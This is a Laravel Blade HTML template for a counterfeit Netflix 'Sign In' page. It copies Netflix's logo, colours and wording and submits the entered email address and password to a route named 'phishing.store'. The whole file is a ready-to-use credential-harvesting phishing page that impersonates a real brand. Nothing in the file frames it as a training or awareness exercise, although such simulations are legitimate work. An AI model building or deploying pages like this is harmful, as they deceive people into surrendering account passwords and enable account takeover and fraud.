<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Sign In</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 800 800"><defs><radialGradient id="a" cx="50%" cy="50%" r="50%" fx="50%" fy="50%"><stop offset="0%" stop-color="%23000" stop-opacity=".5"/><stop offset="100%" stop-color="%23000" stop-opacity="0"/></radialGradient></defs><rect fill="%23E50914" width="100%" height="100%"/><rect fill="url(%23a)" width="100%" height="100%"/></svg>') no-repeat center center fixed;
            background-color: #000;
            background-size: cover;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            color: #fff;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .netflix-container {
            width: 100%;
            max-width: 450px;
            padding: 60px 68px 40px;
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
        }
        
        .netflix-logo {
            margin-bottom: 30px;
        }
        
        .netflix-logo svg {
            height: 45px;
            fill: #e50914;
        }
        
        .netflix-title {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 28px;
        }
        
        .form-control {
            background: #333;
            border: 0;
            border-radius: 4px;
            color: #fff;
            height: 50px;
            line-height: 50px;
            padding: 16px 20px;
            margin-bottom: 16px;
        }
        
        .form-control:focus {
            background: #444;
            box-shadow: none;
            color: #fff;
        }
        
        .btn-netflix {
            background-color: #e50914;
            color: #fff;
            border: 0;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            margin: 24px 0 12px;
            padding: 16px;
            width: 100%;
        }
        
        .btn-netflix:hover {
            background-color: #f40612;
        }
        
        .form-check-input {
            background-color: #737373;
            border: 0;
        }
        
        .form-check-input:checked {
            background-color: #e50914;
            border-color: #e50914;
        }
        
        .help-links {
            color: #b3b3b3;
            font-size: 13px;
            margin-top: 16px;
        }
        
        .help-links a {
            color: #b3b3b3;
            text-decoration: none;
        }
        
        .help-links a:hover {
            text-decoration: underline;
        }
        
        .signup-now {
            color: #737373;
            font-size: 16px;
            margin-top: 16px;
        }
        
        .signup-now a {
            color: #fff;
            text-decoration: none;
        }
        
        .signup-now a:hover {
            text-decoration: underline;
        }
        
        .recaptcha {
            font-size: 13px;
            color: #8c8c8c;
            margin-top: 16px;
        }
        
        .alert-success {
            background-color: rgba(0, 128, 0, 0.7);
            color: #fff;
            border: none;
            border-radius: 4px;
            text-align: center;
            padding: 10px;
            margin-bottom: 15px;
        }
        
        @media (max-width: 740px) {
            body {
                background: #000;
            }
            
            .netflix-container {
                max-width: 100%;
                padding: 40px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="netflix-container">
        <div class="netflix-logo">
            <svg viewBox="0 0 111 30" fill="#e50914">
                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2499766 C43.7810479,26.2499766 42.1876465,26.2499766 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
            </svg>
        </div>

        <h1 class="netflix-title">Sign In</h1>

        @if(session('success'))
            <div class="alert alert-success">{{ session('success') }}</div>
        @endif

        <form action="{{ route('phishing.store') }}" method="POST">
            @csrf
            <input type="hidden" name="category" value="{{ $category }}">

            <div class="mb-3">
                <input type="email" class="form-control" id="email" name="email" placeholder="Email or phone number" required>
            </div>

            <div class="mb-3">
                <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
            </div>

            <button type="submit" class="btn btn-netflix">Sign In</button>

            <div class="form-check mb-3">
                <input class="form-check-input" type="checkbox" id="rememberMe">
                <label class="form-check-label" for="rememberMe">
                    Remember me
                </label>
            </div>
        </form>

        <div class="help-links">
            <a href="#">Need help?</a>
        </div>

        <div class="signup-now">
            New to Netflix? <a href="#">Sign up now</a>.
        </div>

        <div class="recaptcha">
            This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>